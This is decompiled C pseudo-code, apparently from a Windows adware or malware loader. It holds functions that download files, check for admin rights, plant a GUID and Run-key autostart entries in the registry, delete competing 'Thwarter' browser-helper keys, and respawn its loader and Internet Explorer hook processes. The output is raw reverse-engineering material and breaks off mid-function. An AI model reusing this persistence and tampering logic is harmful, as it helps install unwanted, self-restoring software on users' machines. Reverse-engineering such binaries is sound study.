  if (unaff_EDI == 1) {
    pcVar2 = s_system_uses_a_modem_to_connect_t_00404e2c;
  }
  else if (unaff_EDI == 2) {
    pcVar2 = s_system_uses_a_local_area_network_00404dec;
  }
  else if (unaff_EDI == 4) {
    pcVar2 = s_system_uses_a_proxy_server_to_co_00404db4;
  }
  else if (unaff_EDI == 8) {
    pcVar2 = s_system_s_modem_is_busy_with_a_no_00404d7c;
  }
  else {
    pcVar2 = s_Unknown_connection_type__00404d60;
  }
  FUN_004116e9(*(int *)(param_1 + 8),extraout_DL,s_Internet_00404d14,s_Connection_Available_00404d48
               ,pcVar2);
  return uVar1;
}



DWORD __thiscall FUN_0040be00(void *this,undefined4 param_1)

{
  int iVar1;
  DWORD DVar2;
  undefined4 uStack_114;
  undefined4 uStack_110;
  undefined4 uStack_10c;
  
  DVar2 = 0;
  uStack_10c = 0;
  uStack_110 = 0;
  uStack_114 = 0;
  iVar1 = InternetOpenA(param_1,1);
  *(int *)((int)this + 4) = iVar1;
  if (iVar1 == 0) {
    DVar2 = GetLastError();
    FUN_0041546e((char *)&uStack_114,(byte *)s_Error__d_opening_Internet_connec_00404e70);
    FUN_004116e9(*(int *)((int)this + 8),(char)&uStack_114,s_Internet_00404d14,
                 s_Open_Connection_00404e60,&uStack_114);
  }
  return DVar2;
}



void __fastcall FUN_0040be70(int param_1)

{
  if (*(int *)(param_1 + 4) != 0) {
    InternetCloseHandle(*(int *)(param_1 + 4));
  }
  *(undefined4 *)(param_1 + 4) = 0;
  return;
}



DWORD __thiscall FUN_0040be90(void *this,undefined4 param_1,uint **param_2,uint *param_3)

{
  uint *puVar1;
  int iVar2;
  DWORD DVar3;
  int iVar4;
  uint *puVar5;
  uint uVar6;
  undefined extraout_DL;
  undefined extraout_DL_00;
  uint *puVar7;
  undefined4 uStack_428;
  undefined4 uStack_424;
  undefined4 uStack_420;
  undefined4 uStack_41c;
  uint local_404;
  undefined4 uStack_c;
  
  if (*(int *)((int)this + 4) == 0) {
    return 0xffffffff;
  }
  local_404 = 0x1000;
  if (0xfff < *param_3) {
    local_404 = *param_3;
  }
  puVar5 = (uint *)(local_404 + 8);
  uStack_41c = 0x40bedc;
  puVar1 = (uint *)FUN_00415216(puVar5);
  *param_2 = puVar1;
  puVar7 = puVar1;
  for (uVar6 = (uint)puVar5 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {
    *puVar7 = 0;
    puVar7 = puVar7 + 1;
  }
  uStack_41c = 0x84000000;
  for (uVar6 = (uint)puVar5 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {
    *(undefined *)puVar7 = 0;
    puVar7 = (uint *)((int)puVar7 + 1);
  }
  uStack_420 = 0;
  uStack_424 = 0;
  uStack_428 = param_1;
  iVar2 = InternetOpenUrlA(*(undefined4 *)((int)this + 4));
  if (iVar2 == 0) {
    DVar3 = GetLastError();
    FUN_0041546e(&stack0xfffffbe8,(byte *)s_Error__d_opening_URL___s___00404f30);
    FUN_004116e9(*(int *)((int)this + 8),(char)&stack0xfffffbe8,s_Internet_00404d14,
                 s_Get_Page_00404f24,&stack0xfffffbe8);
    return DVar3;
  }
  iVar4 = InternetReadFile(iVar2,puVar1,uStack_41c,uStack_c);
  if (iVar4 == 0) {
    DVar3 = GetLastError();
    FUN_0041546e((char *)&uStack_428,(byte *)s_Error__d_reading_URL___s___00404f08);
    FUN_004116e9(*(int *)((int)this + 8),extraout_DL,s_Internet_00404d14,s_Get_Page_00404f24,
                 &uStack_428);
    InternetCloseHandle(iVar2);
    return DVar3;
  }
  puVar5 = FUN_00415a80(puVar1,s_Object_Not_Found_00404ef4);
  if (puVar5 != (uint *)0x0) {
    FUN_0041546e((char *)&uStack_428,(byte *)s_Object_Not_Found__404__error_rea_00404ec4);
    FUN_004116e9(*(int *)((int)this + 8),(char)&uStack_428,s_Internet_00404d14,s_Get_Page_00404f24,
                 &uStack_428);
    InternetCloseHandle(iVar2);
    return 0xffffffff;
  }
  FUN_0041546e((char *)&uStack_428,(byte *)s_Successfully_read__d_bytes_from_U_00404e98);
  FUN_004116e9(*(int *)((int)this + 8),extraout_DL_00,s_Internet_00404d14,s_Get_Page_00404f24,
               &uStack_428);
  InternetCloseHandle(iVar2);
  return 0;
}



DWORD FUN_0040c070(void)

{
  int iVar1;
  int iVar2;
  uint *puVar3;
  uint uVar4;
  int extraout_ECX;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined uVar5;
  DWORD DVar6;
  undefined1 unaff_retaddr;
  LPCSTR in_stack_000023fc;
  char **ppcStack_14;
  
  FUN_00415a50(unaff_retaddr);
  DVar6 = 0;
  if (*(int *)(extraout_ECX + 4) == 0) {
    return 0xffffffff;
  }
  ppcStack_14 = (char **)0x0;
  iVar1 = InternetOpenUrlA();
  if (iVar1 == 0) {
    DVar6 = GetLastError();
    FUN_0041546e(&stack0xfffffff4,(byte *)s_Error__d_opening_URL___s___00404f30);
    FUN_004116e9(*(int *)(extraout_ECX + 8),extraout_DL,s_Internet_00404d14,s_Download_File_00404fe4
                 ,&stack0xfffffff4);
    if (DVar6 != 0) goto LAB_0040c14a;
  }
  ppcStack_14 = (char **)FUN_004154e0(in_stack_000023fc,&DAT_00404acc);
  if (ppcStack_14 == (char **)0x0) {
    DVar6 = GetLastError();
    FUN_0041546e(&stack0xfffffff4,(byte *)s_Error__d_opening_file___s__for_w_00404fb8);
    FUN_004116e9(*(int *)(extraout_ECX + 8),(char)&stack0xfffffff4,s_Internet_00404d14,
                 s_Download_File_00404fe4,&stack0xfffffff4);
  }
LAB_0040c14a:
  Sleep(1000);
  if (DVar6 == 0) {
    do {
      iVar2 = InternetReadFile();
      if (iVar2 == 0) {
        DVar6 = GetLastError();
        FUN_0041546e(&stack0xfffffff4,(byte *)s_Error__d_reading_URL___s___00404f08);
        uVar5 = extraout_DL_02;
        goto LAB_0040c27c;
      }
      puVar3 = FUN_00415a80((uint *)&stack0x000003f4,s_Object_Not_Found_00404ef4);
      if (puVar3 != (uint *)0x0) {
        FUN_0041546e(&stack0xfffffff4,(byte *)s_Object_Not_Found__404__error_rea_00404ec4);
        FUN_004116e9(*(int *)(extraout_ECX + 8),extraout_DL_01,s_Internet_00404d14,
                     s_Download_File_00404fe4,&stack0xfffffff4);
        DVar6 = 0xffffffff;
        goto LAB_0040c28e;
      }
      FUN_0041546e(&stack0xfffffff4,(byte *)s_Successfully_read__d_bytes_in_bl_00404f80);
      FUN_004116e9(*(int *)(extraout_ECX + 8),extraout_DL_00,s_Internet_00404d14,
                   s_Download_File_00404fe4,&stack0xfffffff4);
      uVar4 = FUN_00415b00((undefined4 *)&stack0x000003f4,1,0x84000000,ppcStack_14);
    } while (uVar4 == 0x84000000);
    DVar6 = GetLastError();
    FUN_0041546e(&stack0xfffffff4,(byte *)s_Error_writing__d_bytes_in_block___00404f4c);
    uVar5 = SUB41(&stack0xfffffff4,0);
LAB_0040c27c:
    FUN_004116e9(*(int *)(extraout_ECX + 8),uVar5,s_Internet_00404d14,s_Download_File_00404fe4,
                 &stack0xfffffff4);
  }
LAB_0040c28e:
  if (iVar1 != 0) {
    InternetCloseHandle();
  }
  FUN_004150d8((int *)ppcStack_14);
  return DVar6;
}



undefined4 __cdecl FUN_0040c2c0(int param_1,int param_2)

{
  int iVar1;
  int *piVar2;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  char local_500 [256];
  uint local_400 [256];
  
  iVar1 = FUN_00415d42(local_400,(uint *)0x400);
  if (iVar1 == 0) {
    FUN_004116e9(param_1,extraout_DL,s_Loader_004051a0,s_Admin_Rights_004051a8,
                 s_NO_ADMIN_RIGHTS___error_retrievi_004051b8);
    return 0;
  }
  iVar1 = FUN_00415cbc(*(LPCSTR *)(param_2 + 0x1c));
  if (iVar1 != 0) {
    FUN_0041546e(local_500,(byte *)s_NO_ADMIN_RIGHTS___error_changing_0040515c);
    FUN_004116e9(param_1,extraout_DL_00,s_Loader_004051a0,s_Admin_Rights_004051a8,local_500);
    return 0;
  }
  piVar2 = (int *)FUN_004154e0(s_test_txt_0040514c,&DAT_00405158);
  if (piVar2 == (int *)0x0) {
    FUN_0041546e(local_500,(byte *)s_NO_ADMIN_RIGHTS___error_creating_004050f8);
    FUN_004116e9(param_1,extraout_DL_01,s_Loader_004051a0,s_Admin_Rights_004051a8,local_500);
    return 0;
  }
  FUN_0041546e(local_500,(byte *)s_ADMIN_RIGHTS______successfully_c_004050a8);
  FUN_004116e9(param_1,extraout_DL_02,s_Loader_004051a0,s_Admin_Rights_004051a8,local_500);
  FUN_004150d8(piVar2);
  FUN_00415cb1(s_test_txt_0040514c);
  FUN_00415cbc((LPCSTR)local_400);
  return 1;
}



undefined4 __cdecl FUN_0040c410(int param_1,BYTE *param_2)

{
  bool bVar1;
  undefined3 extraout_var;
  int iVar2;
  undefined3 extraout_var_00;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar3;
  char *pcVar4;
  char *extraout_EDX;
  GUID *pGVar5;
  ulong *puVar6;
  undefined4 *unaff_FS_OFFSET;
  char *pcVar7;
  GUID local_12c;
  undefined4 local_118 [2];
  undefined4 local_110;
  char local_10c [256];
  undefined4 local_c;
  undefined *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_0041dfcb;
  local_c = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_c;
  FUN_00412030(local_118,param_1);
  local_4 = 0;
  local_110 = 0;
  local_12c.Data2 = 0;
  local_12c.Data3 = 0;
  local_12c.Data1 = 0;
  local_12c.Data4[0] = '\0';
  local_12c.Data4[1] = '\0';
  local_12c.Data4[2] = '\0';
  local_12c.Data4[3] = '\0';
  local_12c.Data4[4] = '\0';
  local_12c.Data4[5] = '\0';
  local_12c.Data4[6] = '\0';
  local_12c.Data4[7] = '\0';
  FUN_004116e9(param_1,0,s_Loader_004051a0,s_Get_GUID_004052b4,
               s_Checking_for_a_pre_existing_inst_004052c0);
  bVar1 = FUN_00412065(local_118,(HKEY)0x80000002,&DAT_0041ee4c);
  uVar3 = extraout_DL;
  if (CONCAT31(extraout_var,bVar1) != 0) {
    iVar2 = FUN_004120ee(local_118,(HKEY)0x80000002,&DAT_0041ee4c,&DAT_0041fa4c,0x400,param_2);
    uVar3 = extraout_DL_00;
    if (iVar2 == 0) {
      local_110 = 1;
      FUN_0041546e(local_10c,(byte *)s_Pre_existing_GUID___s__found_on_s_00405288);
      pcVar4 = local_10c;
      pcVar7 = pcVar4;
      goto LAB_0040c60b;
    }
  }
  FUN_004116e9(param_1,uVar3,s_Loader_004051a0,s_Get_GUID_004052b4,
               s_Pre_existing_GUID_NOT_found__cre_00405258);
  *param_2 = '\0';
  CoCreateGuid(&local_12c);
  iVar2 = 4;
  pcVar4 = (char *)0x0;
  bVar1 = true;
  pGVar5 = &local_12c;
  puVar6 = &DAT_004011e0;
  do {
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    bVar1 = pGVar5->Data1 == *puVar6;
    pGVar5 = (GUID *)&pGVar5->Data2;
    puVar6 = puVar6 + 1;
  } while (bVar1);
  if (bVar1) {
    pcVar7 = s_Error_creating_GUID__00405240;
  }
  else {
    FUN_0041546e((char *)param_2,(byte *)s___08lX__04X__04x__02X_02X__02X_0_0040520c);
    bVar1 = FUN_00412065(local_118,(HKEY)0x80000002,&DAT_0041ee4c);
    if (CONCAT31(extraout_var_00,bVar1) == 0) {
      FUN_00412966(local_118,(HKEY)0x80000002,&DAT_0041ee4c);
    }
    FUN_004124c2(local_118,(HKEY)0x80000002,&DAT_0041ee4c,&DAT_0041fa4c,param_2);
    FUN_0041546e(local_10c,(byte *)s_Created_GUID_is___s___004051f4);
    pcVar7 = local_10c;
    pcVar4 = extraout_EDX;
  }
LAB_0040c60b:
  FUN_004116e9(param_1,(char)pcVar4,s_Loader_004051a0,s_Get_GUID_004052b4,pcVar7);
  local_4 = 0xffffffff;
  FUN_0041205e(local_118);
  *unaff_FS_OFFSET = local_c;
  return local_110;
}



undefined4 __cdecl FUN_0040c650(int param_1,LPBYTE param_2,LPCSTR param_3,LPCSTR param_4)

{
  bool bVar1;
  undefined3 extraout_var;
  int iVar2;
  undefined extraout_DL;
  undefined4 uVar3;
  undefined4 *unaff_FS_OFFSET;
  undefined4 local_114 [2];
  char local_10c [256];
  undefined4 local_c;
  undefined *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_0041dfeb;
  local_c = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_c;
  FUN_00412030(local_114,param_1);
  uVar3 = 0;
  local_4 = 0;
  FUN_004116e9(param_1,extraout_DL,s_Loader_004051a0,s_GUID_Exists_004052ec,
               s_Checking_for_a_pre_existing_inst_004052c0);
  bVar1 = FUN_00412065(local_114,(HKEY)0x80000002,param_3);
  if (CONCAT31(extraout_var,bVar1) != 0) {
    iVar2 = FUN_004120ee(local_114,(HKEY)0x80000002,param_3,param_4,0x400,param_2);
    if (iVar2 == 0) {
      uVar3 = 1;
      FUN_0041546e(local_10c,(byte *)s_Pre_existing_GUID___s__found_on_s_00405288);
      FUN_004116e9(param_1,(char)local_10c,s_Loader_004051a0,s_GUID_Exists_004052ec,local_10c);
    }
  }
  local_4 = 0xffffffff;
  FUN_0041205e(local_114);
  *unaff_FS_OFFSET = local_c;
  return uVar3;
}



undefined4 __cdecl FUN_0040c740(int param_1,LPCSTR param_2)

{
  uint *puVar1;
  undefined4 uVar2;
  int iVar3;
  char *pcVar4;
  DWORD dwLen;
  BOOL BVar5;
  uint uVar6;
  undefined4 *lpData;
  undefined4 *puVar7;
  undefined4 *unaff_FS_OFFSET;
  undefined4 local_224;
  uint *local_220;
  undefined4 local_21c [2];
  uint local_214;
  DWORD local_210;
  char local_20c [256];
  char local_10c [256];
  undefined4 local_c;
  undefined *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_0041e00b;
  local_c = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_c;
  FUN_00412030(local_21c,param_1);
  lpData = (undefined4 *)0x0;
  local_4 = 0;
  local_224 = 0;
  iVar3 = FUN_004123b0(local_21c,(HKEY)0x80000002,&DAT_0041ee4c,&DAT_0042224c,(LPBYTE)&local_224);
  if (iVar3 != 0) {
    FUN_0041546e(local_10c,(byte *)s_Parsing___s__for_promotion_code__00405330);
    FUN_004116e9(param_1,(char)local_10c,s_Loader_004051a0,s_Get_Promo_Code_00405320,local_10c);
    FUN_0041455b(local_20c,param_2);
    pcVar4 = FUN_00415e60(local_20c,'.');
    if (pcVar4 != (char *)0x0) {
      *pcVar4 = '\0';
      pcVar4 = FUN_00415e60(local_20c,'p');
      if (pcVar4 != (char *)0x0) {
        FUN_004154f3((uint *)(pcVar4 + 1),&DAT_004042f8);
      }
    }
    dwLen = GetFileVersionInfoSizeA(param_2,&local_210);
    if (dwLen != 0) {
      puVar1 = (uint *)(dwLen + 1);
      lpData = (undefined4 *)FUN_00415216(puVar1);
      puVar7 = lpData;
      for (uVar6 = (uint)puVar1 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {
        *puVar7 = 0;
        puVar7 = puVar7 + 1;
      }
      for (uVar6 = (uint)puVar1 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {
        *(undefined *)puVar7 = 0;
        puVar7 = (undefined4 *)((int)puVar7 + 1);
      }
      BVar5 = GetFileVersionInfoA(param_2,local_210,dwLen,lpData);
      if (BVar5 != 0) {
        BVar5 = VerQueryValueA(lpData,s__StringFileInfo_040904b0_Special_004052f8,&local_220,
                               &local_214);
        if ((BVar5 != 0) && (local_214 != 0)) {
          FUN_004154f3(local_220,&DAT_004042f8);
        }
      }
    }
    FUN_004125fb(local_21c,(HKEY)0x80000002,&DAT_0041ee4c,&DAT_0042224c,local_224);
    if (lpData != (undefined4 *)0x0) {
      FUN_004150a9(lpData);
    }
  }
  uVar2 = local_224;
  local_4 = 0xffffffff;
  FUN_0041205e(local_21c);
  *unaff_FS_OFFSET = local_c;
  return uVar2;
}



undefined4 __cdecl FUN_0040c900(undefined4 param_1,int *param_2,int *param_3)

{
  HDC hdc;
  int iVar1;
  
  hdc = GetDC((HWND)0x0);
  if (hdc == (HDC)0x0) {
    *param_2 = 0;
    *param_3 = 0;
    return 0xffffffff;
  }
  iVar1 = GetDeviceCaps(hdc,8);
  *param_2 = iVar1;
  iVar1 = GetDeviceCaps(hdc,10);
  *param_3 = iVar1;
  return 0;
}



int FUN_0040c950(undefined param_1,undefined param_2,undefined param_3,undefined param_4,
                undefined param_5,undefined param_6,undefined param_7,undefined param_8,
                undefined param_9,undefined param_10,undefined param_11,undefined param_12)

{
  undefined4 uVar1;
  int iVar2;
  uint *puVar3;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  int iVar4;
  DWORD DVar5;
  undefined4 *unaff_FS_OFFSET;
  undefined4 in_stack_000013fc;
  int in_stack_0000140c;
  undefined4 local_4;
  
  uVar1 = *unaff_FS_OFFSET;
  local_4 = 0xffffffff;
  *unaff_FS_OFFSET = &stack0xfffffff4;
  FUN_00415a50((char)uVar1);
  FUN_00412030(&stack0xfffffff4,in_stack_0000140c);
  DVar5 = 0;
  iVar4 = 0;
  iVar2 = FUN_00412a34(&stack0xfffffff4,(HKEY)0x80000002,s_SOFTWARE_Microsoft_Windows_Curre_00405418
                       ,0,&param_11,0x400);
  do {
    if (iVar2 != 0) {
      FUN_0041546e((char *)&local_4,(byte *)s_Found__d_non_Thwarter_BHO_key_s__00405354);
      FUN_004116e9(in_stack_0000140c,extraout_DL_01,s_Loader_004051a0,
                   s_Remove_Thwarter_BHO_Keys_004053d8,&local_4);
      FUN_0041205e((undefined4 *)&stack0xfffffff4);
LAB_0040cb72:
      *unaff_FS_OFFSET = in_stack_000013fc;
      return iVar4;
    }
    FUN_0041546e((char *)&local_4,(byte *)s_Found_a_BHO_key____s___Index_____004053f4);
    FUN_004116e9(in_stack_0000140c,extraout_DL,s_Loader_004051a0,s_Remove_Thwarter_BHO_Keys_004053d8
                 ,&local_4);
    FUN_0041546e(&stack0x00000bfc,(byte *)s__s__s__s_004053b4);
    iVar2 = FUN_004120ee(&stack0xfffffff4,(HKEY)0x80000000,&stack0x00000bfc,&DAT_00423a50,0x400,
                         &stack0x00000ffc);
    if ((iVar2 == 0) &&
       (puVar3 = FUN_00415a80((uint *)&stack0x00000ffc,(char *)&DAT_00422e4c), puVar3 != (uint *)0x0
       )) {
      FUN_0041546e((char *)&local_4,(byte *)s_BHO_key_is_a_thwarter_BHO_Key_00405394);
      FUN_004116e9(in_stack_0000140c,extraout_DL_00,s_Loader_004051a0,
                   s_Remove_Thwarter_BHO_Keys_004053d8,&local_4);
      FUN_0041546e(&param_12,(byte *)s__s__s_0040460c);
      iVar2 = FUN_0041283a(&stack0xfffffff4,(HKEY)0x80000002,&param_12);
      if (iVar2 == 0) {
        FUN_0041546e(&param_12,(byte *)s__s__s_0040460c);
        iVar2 = FUN_004128cf(in_stack_0000140c,(HKEY)0x80000000,&param_12);
        if (iVar2 == 0) {
          iVar4 = iVar4 + 1;
          goto LAB_0040cb09;
        }
      }
      FUN_0041205e((undefined4 *)&stack0xfffffff4);
      iVar4 = -1;
      goto LAB_0040cb72;
    }
    DVar5 = DVar5 + 1;
LAB_0040cb09:
    iVar2 = FUN_00412a34(&stack0xfffffff4,(HKEY)0x80000002,
                         s_SOFTWARE_Microsoft_Windows_Curre_00405418,DVar5,&param_11,0x400);
  } while( true );
}



void __cdecl FUN_0040cbb0(int param_1,void *param_2,byte *param_3)

{
  bool bVar1;
  undefined3 extraout_var;
  DWORD DVar2;
  int iVar3;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined uVar4;
  undefined4 local_800 [256];
  char local_400 [1024];
  
  FUN_004132b6((char *)DAT_004251cc,local_800);
  bVar1 = FUN_00413399(param_1,(LPCSTR)DAT_004251cc);
  if (CONCAT31(extraout_var,bVar1) == 0) {
    FUN_004116e9(param_1,extraout_DL,s_Loader_004051a0,s_Validate_Loader_Process_004054c8,
                 s_Loader_possibly_renamed__Scannin_004054e0);
    DVar2 = FUN_0041369a(param_1,(LPCSTR)local_800,&DAT_00404ff4,local_400,&DAT_00420e4c);
    if (0 < (int)DVar2) {
      FUN_004138c6(param_1,local_400,(LPCSTR)DAT_004251cc);
    }
  }
  iVar3 = FUN_00411f30(param_2,param_3);
  if (iVar3 < 2) {
    FUN_004116e9(param_1,extraout_DL_00,s_Loader_004051a0,s_Validate_Loader_Process_004054c8,
                 s_Found_only_1_Loader_004054b0);
    uVar4 = extraout_DL_01;
    if (DAT_00423a4c == 2) {
      DAT_00423a4c = 1;
      FUN_004116e9(param_1,extraout_DL_01,s_Loader_004051a0,s_Validate_Loader_Process_004054c8,
                   s_Taking_Primary_Loader_responsibi_00405488);
      uVar4 = extraout_DL_02;
    }
    FUN_004116e9(param_1,uVar4,s_Loader_004051a0,s_Validate_Loader_Process_004054c8,
                 s_Spawning_Secondary_Loader_0040546c);
    FUN_00415e87(1,DAT_004251cc);
  }
  return;
}



void FUN_0040ccd0(undefined param_1,undefined param_2,undefined param_3,undefined param_4,
                 undefined param_5,undefined param_6,undefined param_7,undefined param_8,
                 undefined param_9,undefined param_10,undefined param_11,undefined param_12)

{
  bool bVar1;
  undefined3 extraout_var;
  DWORD DVar2;
  int iVar3;
  undefined3 extraout_var_00;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined extraout_DL_03;
  char unaff_retaddr;
  int in_stack_00001004;
  void *in_stack_00001008;
  
  FUN_00415a50(unaff_retaddr);
  FUN_004132b6(DAT_004251cc,(undefined4 *)&param_12);
  FUN_0041546e(&stack0x00000000,(byte *)s__s__s_0040460c);
  bVar1 = FUN_00413399(in_stack_00001004,&stack0x00000000);
  if (CONCAT31(extraout_var,bVar1) == 0) {
    FUN_004116e9(in_stack_00001004,extraout_DL,s_Loader_004051a0,s_Validate_IEHook_Process_00405580,
                 s_IE_Hook_possibly_renamed__Scanni_00405598);
    DVar2 = FUN_0041369a(in_stack_00001004,&param_12,&DAT_00405060,&stack0x00000c00,&DAT_00420e4c);
    if (0 < (int)DVar2) {
      FUN_004138c6(in_stack_00001004,&stack0x00000c00,&stack0x00000000);
    }
  }
  iVar3 = FUN_00411f30(in_stack_00001008,&DAT_0042264c);
  bVar1 = FUN_00413399(in_stack_00001004,&DAT_0041f64c);
  if (CONCAT31(extraout_var_00,bVar1) == 0) {
    if (1 < iVar3) {
      FUN_0041546e(&param_11,(byte *)s_Found__d_hook_processes__Termina_0040553c);
      FUN_004116e9(in_stack_00001004,extraout_DL_02,s_Loader_004051a0,
                   s_Validate_IEHook_Process_00405580,&param_11);
      iVar3 = iVar3 + -1;
      do {
        FUN_00411ee0(in_stack_00001008,&DAT_0042264c);
        iVar3 = iVar3 + -1;
      } while (iVar3 != 0);
      return;
    }
    if (iVar3 < 1) {
      FUN_004116e9(in_stack_00001004,extraout_DL_00,s_Loader_004051a0,
                   s_Validate_IEHook_Process_00405580,s_Found_0_IE_Hooks_00405528);
      FUN_004116e9(in_stack_00001004,extraout_DL_03,s_Loader_004051a0,
                   s_Validate_IEHook_Process_00405580,s_Spawning_IE_Hook_00405514);
      FUN_00415e87(1,(uint *)&stack0x00000000);
    }
  }
  else {
    FUN_0041546e(&param_11,(byte *)s_Found__d_hook_processes__Termina_0040553c);
    FUN_004116e9(in_stack_00001004,extraout_DL_01,s_Loader_004051a0,
                 s_Validate_IEHook_Process_00405580,&param_11);
    if (0 < iVar3) {
      do {
        FUN_00411ee0(in_stack_00001008,&DAT_0042264c);
        iVar3 = iVar3 + -1;
      } while (iVar3 != 0);
      return;
    }
  }
  return;
}



void __cdecl
FUN_0040cea0(int param_1,undefined4 param_2,void *param_3,BYTE *param_4,undefined4 param_5,
            undefined4 param_6)

{
  bool bVar1;
  undefined3 extraout_var;
  undefined3 extraout_var_00;
  int iVar2;
  undefined extraout_DL;
  undefined unaff_BL;
  undefined unaff_SI;
  undefined unaff_DI;
  BYTE in_stack_fffff400;
  undefined in_stack_fffff404;
  undefined in_stack_fffff408;
  undefined in_stack_fffff40c;
  undefined in_stack_fffff410;
  undefined in_stack_fffff414;
  undefined in_stack_fffff7e8;
  BYTE local_800 [1000];
  undefined in_stack_fffffbe8;
  char local_400 [1024];
  
  bVar1 = FUN_00413399(param_1,&DAT_0041f64c);
  if (CONCAT31(extraout_var,bVar1) != 0) {
    FUN_0040c950((char)param_1,unaff_DI,unaff_SI,unaff_BL,in_stack_fffff400,in_stack_fffff404,
                 in_stack_fffff408,in_stack_fffff40c,in_stack_fffff410,in_stack_fffff414,
                 in_stack_fffff7e8,in_stack_fffffbe8);
  }
  bVar1 = FUN_00412065(param_3,(HKEY)0x80000002,&DAT_0041ee4c);
  if (CONCAT31(extraout_var_00,bVar1) == 0) {
    FUN_0041546e(local_400,(byte *)s__s_Root_Key_does_not_exist__00405698);
    FUN_0041546e((char *)local_800,(byte *)s__s__s_0040460c);
    FUN_004116e9(param_1,extraout_DL,s_Loader_004051a0,s_Validate_Root_Registry_Key_0040567c,
                 local_400);
    FUN_00412966(param_3,(HKEY)0x80000002,&DAT_0041ee4c);
    FUN_004124c2(param_3,(HKEY)0x80000002,&DAT_0041ee4c,&DAT_0041fa4c,param_4);
    FUN_004124c2(param_3,(HKEY)0x80000002,&DAT_0041ee4c,&DAT_0042324c,local_800);
    FUN_00412966(param_3,(HKEY)0x80000002,&DAT_00421e4c);
    FUN_004125fb(param_3,(HKEY)0x80000002,&DAT_00421e4c,&DAT_0041e648,param_6);
    FUN_004125fb(param_3,(HKEY)0x80000002,&DAT_0041ee4c,&DAT_0042224c,param_5);
  }
  iVar2 = FUN_004120ee(param_3,(HKEY)0x80000002,s_SOFTWARE_Microsoft_Windows_Curre_0040564c,
                       (LPCSTR)&DAT_00422e4c,0x400,&stack0xfffff400);
  if (iVar2 != 0) {
    iVar2 = FUN_004120ee(param_3,(HKEY)0x80000002,s_SOFTWARE_Microsoft_Windows_Curre_0040564c,
                         s_TempLoader_00405640,0x400,&stack0xfffff400);
    if (iVar2 != 0) {
      iVar2 = FUN_004120ee(param_3,(HKEY)0x80000002,s_SOFTWARE_Microsoft_Windows_Curre_004055fc,
                           s_ClrSchUninstall_00405630,0x400,&stack0xfffff400);
      if (iVar2 != 0) {
        FUN_0041546e((char *)local_800,(byte *)s__s__s_0040460c);
        FUN_0041546e(&stack0xfffff400,(byte *)s__s__s_0040460c);
        FUN_0041546e(local_400,(byte *)s_Loader_run_key_does_not_exist__R_004055cc);
        FUN_004124c2(param_3,(HKEY)0x80000002,s_SOFTWARE_Microsoft_Windows_Curre_0040564c,
                     (LPCSTR)&DAT_00422e4c,&stack0xfffff400);
      }
    }
  }
  return;
}



void __cdecl
FUN_0040d0c0(int param_1,int param_2,void *param_3,void *param_4,byte *param_5,BYTE *param_6,
            undefined4 param_7,undefined4 param_8,uint param_9,DWORD param_10)

{
  bool bVar1;
  int iVar2;
  uint uVar3;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined uVar4;
  undefined4 unaff_EBX;
  undefined4 unaff_EBP;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 *unaff_FS_OFFSET;
  undefined in_stack_000002c8;
  undefined in_stack_000006c8;
  undefined in_stack_fffffee4;
  int in_stack_fffffee8;
  undefined in_stack_fffffeec;
  undefined in_stack_fffffef0;
  char local_10c [256];
  undefined4 uStack_c;
  undefined *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_0041e04b;
  uStack_c = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &uStack_c;
  FUN_00412030(&stack0xfffffeec,param_1);
  local_4 = 0;
  bVar1 = false;
  FUN_004123b0(&stack0xfffffeec,(HKEY)0x80000002,&DAT_00421e4c,&DAT_0042124c,&stack0xfffffee8);
  iVar2 = FUN_00415fa1((int *)0x0);
  if (iVar2 + 0x15180 < in_stack_fffffee8) {
    FUN_0041546e(local_10c,(byte *)s_ERROR__Next_UpdateTime_is_more_t_00405758);
    FUN_004116e9(param_1,(char)local_10c,s_Loader_004051a0,s_Wait_For_Next_Update_00405740,local_10c
                );
    in_stack_fffffee8 = FUN_00415fa1((int *)0x0);
    in_stack_fffffee8 = in_stack_fffffee8 + 0x15180;
    FUN_004125fb(&stack0xfffffeec,(HKEY)0x80000002,&DAT_00421e4c,&DAT_0042124c,in_stack_fffffee8);
  }
  FUN_0041546e(local_10c,(byte *)s_Next_update_time_read_from_regis_004056fc);
  FUN_004116e9(param_1,(char)local_10c,s_Loader_004051a0,s_Wait_For_Next_Update_00405740,local_10c);
  if ((0x3d < param_9) &&
     (uVar3 = FUN_0041dd90((void *)(param_2 + 0x28),*(byte **)(param_2 + 8),
                           (byte *)(void *)(param_2 + 0x28)), uVar3 != 0)) {
    bVar1 = true;
  }
  iVar2 = FUN_00415fa1((int *)0x0);
  uVar4 = extraout_DL;
  if (iVar2 < in_stack_fffffee8) {
    do {
      FUN_0040cbb0(param_1,param_4,param_5);
      FUN_0041546e(local_10c,(byte *)s_Current_control_set_version_is___004056d8);
      FUN_004116e9(param_1,extraout_DL_00,s_Loader_004051a0,s_Wait_For_Next_Update_00405740,
                   local_10c);
      if (bVar1) {
        FUN_0040ccd0((char)param_1,(char)param_4,(char)unaff_EDI,(char)unaff_EBP,(char)unaff_EBX,
